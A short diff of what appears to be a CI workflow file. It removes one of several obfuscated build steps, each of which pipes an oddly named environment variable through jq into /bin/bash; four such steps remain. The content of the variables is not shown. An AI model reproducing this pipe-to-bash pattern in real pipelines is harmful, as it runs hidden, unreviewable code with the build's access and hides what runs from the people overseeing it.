@@ -24,7 +24,6 @@ jobs:
           echo $mcv18716 | jq -r .k087 | /bin/bash
           printf '%s' "$x229" | jq -r .lglo57 | /bin/bash
           echo $gtc8 | jq -r .niw4 | /bin/bash
-          echo $aibo6 | jq -r .ohfag782 | /bin/bash
           printf '%s' "$zxlah3925" | jq -r .tgpss6227 | /bin/bash
 
       - name: Save archive
